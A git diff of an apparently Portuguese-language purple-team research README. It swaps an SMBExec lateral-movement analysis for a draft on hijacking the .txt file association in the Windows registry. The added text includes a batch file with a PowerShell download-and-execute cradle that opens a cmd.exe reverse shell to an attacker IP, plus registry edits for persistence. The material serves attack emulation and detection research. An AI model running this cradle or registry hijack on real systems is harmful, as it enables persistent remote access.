@@ -3,97 +3,80 @@
   <img src="./imagens/ISHLOGO.png" alt="Logo do Purple Team" width="300" height="300">
 </p>
 
-# CTI Purple Team - Movimentação Lateral Através do Sequestro de Sessão de Serviço RDP
+# CTI Purple Team - Execução Acionada por Evento: Alterar Associação de Arquivo Padrão 
 
-Nesta pesquisa iremos abordar a tática de movimentação lateral, usando a técnica de sequestro de sessão de serviço remoto, realizando o sequestro RDP, que envolve o roubo da sessão remota de um usuário legítimo.
+Quando um arquivo é criado em um sistema operacional como o Windows, ele é automaticamente associado a um programa específico que será usado para abrir esse tipo de arquivo quando clicado duas vezes.
 
-A ideia por trás do SMBExec não é nova, pois o seu vetor de ataque é amplamente conhecido e utilizado por diversos adversários, com o propósito de alcançar a movimentação lateral através da infraestrutura das vítimas. Estamos falando da exploração do protocolo SMB, que se não tiver bem configurada, dará capacidade aos adversários de se mover através da infraestrutura.
+A execução acionada por evento permite que os usuários personalizem a maneira como os arquivos são abertos, definindo regras específicas para acionar a execução de aplicativos diferentes com base em diferentes eventos.
 
-O *Purple Team* já fez uma pesquisa referente a movimentação lateral por meio do SMB, através da pesquisa referente ao uso do *PSExec*.
+As seleções de associação de arquivos são armazenados no Registro do Windows e podem ser editados por usuários, administradores ou programas que tenham acesso ao Registro ou por administradores usando o utilitário associado.
 
-Porém, o que veremos nesta nova pesquisa, é a capacidade do adversário de alcançar o mesmo resultado através do PowerShell, e sem tocar no disco.
+Neste contexto, exploraremos os conceitos por trás da execução acionada por evento representando o sequestro da extenção ***.txt***, sendo possível executar um aplicativo malicioso antes que o arquivo real seja aberto, gerando um reverse shell na máquina do atacante.
 
 ## Contexto
 
-Para que o adversário possa executar estas ações, ele já deve ter alcançado o ***acesso inicial*** e provavelmente alcançado a ***evasão de defesas*** e ***coletas de credenciais***. Por isso o seu próximo movimento será a busca de novos dispositivos na infraestrutura, que possam ser acessados por meio das credenciais coletadas.
+Quando um arquivo ***.txt*** é clicado duas vezes, ele é aberto com um ***notepad.exe***. O windows por padrão sabe que para abrir esse tipo de extensão precisa usar o *notepad.exe*.
+
+As associaçõs de arquivos do sistemas estão listadas em **HKEY_CLASSES_ROOT.[extention]**, no caso dessa pesquisa será listado em **HKEY_CLASSES_ROOT.txt**.
+
+No entanto, é possível sequestrar chaves de registro que controlam o programa padrão para extensões específicas a fim de obter persistência.
 
 
-## Análise e Execução do SMBExec
+## Análise e Execução do código malicioso
 
-O [SMBExec](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBEnum.ps1) é uma ferramenta open-source desenvolvida pelo ***Kevin Robertson***, e tal ferramenta faz parte da biblioteca [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash/tree/master) (também desenvolvida pelo mesmo ator).
-
-Nesta seção vamos explorar os pontos mais importantes do código fonte do *SMBExec*, e algumas características constantes que nos ajudarão a identificar quando esta ferramenta, ou ferramentas similares, forem executadas em um dispositivo. Abaixo, podemos observar o cabeçalho da *ferramenta*.
-
-<p align="center">
-  <img src="imagens/2.smbexec_header.png">
-</p>
-
-Como podemos observar na imagem acima, o SMBExec permite a execução de comandos remoto, por meio da execução da técnica de ***Pass-The-Hash*** utilizando as credenciais em formato *NTLMv2*. A ferramenta também possui suporte para atuar por meio dos protocolos ***SMBv1*** e ***SMBv2***.
-
-Portanto, estas informações nos permitem compreender que ao coletar as *Hashes NTLM*, o adversário pode utilizar o **SMBExec** para executar um *Pass-The-Hash* por meio do protocolo *SMB*.
-
-Ao analisar o código fonte, podemos ver a sequência de características que serão constantes em futuras versões desta ferramenta.
+Há dois locais de registro que definem os manipuladores de extensão, que são mostrados a seguir, e são classificados como: *Global* e *Local*.
 
 <p align="center">
-  <img src="imagens/4.new-packet-smb-negotiate-protocol-request.png">
+  <img src="imagens/locais-de-registro.png">
 </p>
 
-Acima, podemos observar uma sequência de bytes que também é vista nas versões do ***EternelBlue*** desenvolvidas em *PowerShell*, um exploit que explora a vulnerabilidade **MS17-010** (amplamente utilizada pelo ***WannaCry***). Na imagem abaixo, podemos observar esta mesma sequência de bytes presentes numa versão em *PowerShell* do *EternalBlue*, praticamente no mesmo contexto de construção de pacote *SMB* para requisição.
+Quando um usuário tenta abrir um arquivo, o sistema operacional verifica os registros locais em (HKEY_CURRENT_USERS) para determinar qual programa está designado para lidar com aquela extensão de arquivo. Caso nao houver nenhuma entrada de registro associada, a verificação é feita na árvore de registro global (HKEY_CLASSES_ROOT).
+
+Dependendo dos privilégios do usuário (Administrador ou Usuário Padrão), esses locais de registro podem ser explorados para executar código malicioso, utilizando o manipulador de extensão como um gatilho.
+
+A priori, para executar o sequestro de extensão é necessário que o atacante já possua o primeiro acesso inicial à máquina alvo.
+
+Portanto, podemos observar que o manipulador de extensão ***.txt*** está definido na chave de registro abaixo:
+
+Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command ---- [***colocar botao de copiar***]
+
+Abaixo exemplifico que o comando responsável por abrir arquivos *.txt* é o *notepad.exe %1*, onde o argumento *%1*, especifica um nome de arquivo qualquer, ou seja, é uma variante para o nome dos arquivos que o bloco de notas deve abrir:
 
 <p align="center">
-  <img src="imagens/5.ms17-010-scanner-protocol-negotiate.png">
+  <img src="imagens/Editor-de-registro-HKEY.png">
 </p>
 
-Ao continuar nossa análise, nós somos capazes de observar outra constante, que se trata do compartilhamento administrativo oculto alvo desta ferramenta (e também de ferramentas como o ***EternalBlue*** e ***PsExec***), o **IPC$**.
+Supomos que o usuário alvo possua uma arquivo chamado ***test.txt*** em sua área de trabalho, contendo o conteúdo do arquivo ilustrado abaixo:
 
 <p align="center">
-  <img src="imagens/6.ipc$_targeted_pipe_name.png">
+  <img src="imagens/arquivo-vitima.png">
 </p>
 
-Na imagem abaixo, na função referente a configuração da conexão *SMB*, também é possível observar que a ferramenta tem como alvo um pipe específico (*svcctl*), que iremos identificar de maneira mais clara, a utilização este recurso que será acessado pela ferramenta por meio do compartilhamento administrativo oculto *IPC$*.
+Iremos criar agora um arquivo malicioso que será executado quando o usuário alvo tentar abrir um arquivo chamado test.txt, sendo que com a execução desta têcnica pode ser qualquer arquivo aleatório, apenas seguindo o critério de extenção .txt usado como exemplo nesta pesquisa.
 
-Outras duas constante interessantes a serem levadas em conta, são as assinaturas do protocolo a ser utilizado, durante a função de configuração da conexão *SMB*. Abaixo, podemos observar o ID do protocolo **SMBv1**.
+Para isso, criaremos um arquivo em lotes simples do Windows chamado ***shell.cmd*** na maquina do usuário alvo:
+
+start notepad.exe %1
+powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.140.128/purplecat.ps1');purplecat -c 192.168.140.128 -p 8081 -e cmd.exe"  ------- ***COLOCAR BOTAO DE COLAR***
+
+A partir disso, podemos sequestrar a extensão do arquivo .txt, modificando os dados do valor de registro de: Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command para C:\Users\Win-test\Desktop\shell.cmd, local onde nosso arquivo malicioso está gravado.
 
 <p align="center">
-  <img src="imagens/8.smb1_header.png">
+  <img src="imagens/mod.registro.png">
 </p>
 
-E na imagem abaixo, também podemos observar o ID do protocolo **SMBv2**.
+Após a modificação a chave de registro se encontrará da mesma maneira que a imagem abaixo:
 
 <p align="center">
-  <img src="imagens/9.smb2_header.png">
+  <img src="imagens/modificado.png">
 </p>
-
-Como sabemos, ferramentas podem ser alteradas e o SMBExec analisado é a sua versão original e em texto puro. Um adversário habilidoso pode realizar modificações com o propósito de evadir defesas. O método mais utilizado, é a alteração de nomes de funções e variáveis, alteração do nome do script a ser executado, e a exclusão de comentários do código original. Mas, como podemos observar na imagem acima, nos concentramos nas informações constantes e que são essenciais para o funcionamento desta ferramenta.
-
-Agora, vamos observar como podemos utilizar de maneira básico o *SMBExec*. Abaixo, podemos observar que a ferramenta tem uma fácil utilização.
-
-<p align="center">
-  <img src="imagens/17.emulation.png">
-</p>
-
-Acima, podemos observar que o fluxo de execução é bem parecido com a execução do *PsExec*. Uma conexão é feita por meio do protocolo ***SMB*** através do compartilhamento oculto administrativo *IPC$*, o usuário é autenticado no dispositivo alvo, um serviço é criado e executado no dispositivo alvo, e por meio da execução deste serviço o usuário alcança o propósito de execução de comando remoto.
 
 Na seção a seguir, vamos analisar como podemos executar detectar a execução desta ferramenta desenvolvida em *PowerShell*, e validar a reutilização de uma detecção já criada por meio da pesquisa do Purple Team, referente ao **PsExec**.
 
 ## Análise de Comportamento
 
-Como identificamos na seção anterior, o código-fonte da ferramenta ***SMBExec*** possui algumas constantes, que também podem ser identificadas em outras ferramentas com propósitos similares.
 
-São elas:
 
-- **ID dos Protocolos SMBv1 e SMBv2**: ;
-- **Referência do svcctl em bytes**: ;
-- **Referências ao compartilhamento oculto IPC$**;
-- **Configurações de Pacotes SMB**: ;
-
-Para identificar estas características no dispositivo que executou a ferramenta, precisaremos ter o log do ***PowerShell Script Block Logging*** ativo, o ***Event ID 4104***. Este log, é responsável por registrar todas as execuções de comando por meio de **CMDlets**, no prompt do *PowerShell*.
-
-Abaixo podemos observar um bom exemplo de identificação das constantes acima. Na imagem a seguir, é possível identificar a sequência de bytes referente a ao ID do protocolo a ser utilizado.
-
-<p align="center">
-  <img src="imagens/11.smb_packet_creation_detection.png">
-</p>
 
 Este, e as demais constantes observadas no código podem ser identificadas por meio do ***Event ID 4104***.
 
